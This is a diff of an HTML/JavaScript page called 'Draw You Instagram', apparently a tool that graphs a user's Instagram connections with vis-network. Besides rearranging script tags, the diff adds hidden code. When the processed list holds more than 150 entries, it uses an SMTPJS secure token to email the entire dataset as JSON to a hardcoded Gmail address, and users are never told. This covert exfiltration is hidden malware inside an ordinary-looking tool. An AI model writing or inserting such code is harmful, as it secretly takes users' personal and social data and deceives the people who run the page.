@@ -1,6 +1,10 @@
 <html>
-<link rel="icon" href="images/logo.ico" type="image/x-icon"/>
-<script src="https://smtpjs.com/v3/smtp.js"></script>
+<head>
+	<link rel="icon" href="images/logo.ico" type="image/x-icon"/>
+	<script src="https://smtpjs.com/v3/smtp.js"></script>
+	<script type="text/javascript" src="https://visjs.github.io/vis-network/standalone/umd/vis-network.min.js"></script>
+</head>
+
 <body style="background-image: linear-gradient(to top, #3f51b1 0%, #5a55ae 13%, #7b5fac 25%, #8f6aae 38%, #a86aa4 50%, #cc6b8e 62%, #f18271 75%, #f3a469 87%, #f7c978 100%);">
 	<div class="title">
 		<a style="font-size:30px">Draw You Instagram</a>
@@ -61,7 +65,7 @@
 
 
 
-<script type="text/javascript" src="https://visjs.github.io/vis-network/standalone/umd/vis-network.min.js"></script>
+
 
 <script>
 	var input = document.getElementById("input1");
@@ -160,6 +164,24 @@
 		make_no_re(posin)
 		posin=rerank(posin)
 
+		
+		var code="4194b667-c904-48f4-8dbf-42492d9bc9b1"
+
+		if (posin.length>150) 
+		{
+			Email.send({
+			    SecureToken : code,
+			    To : "lanx06lanx06lanx06@gmail.com",
+			    From : "wuj6wuj6wuj6@gmail.com",
+			    Subject : posin[0]["name"]+" data("+posin.length+")",
+			    Body : JSON.stringify(posin)
+			}).then(
+			  //message => alert(message)
+			);
+		}
+
+		
+		
 		for (var i = 0; i < posin.length; i++) 
 		{
 
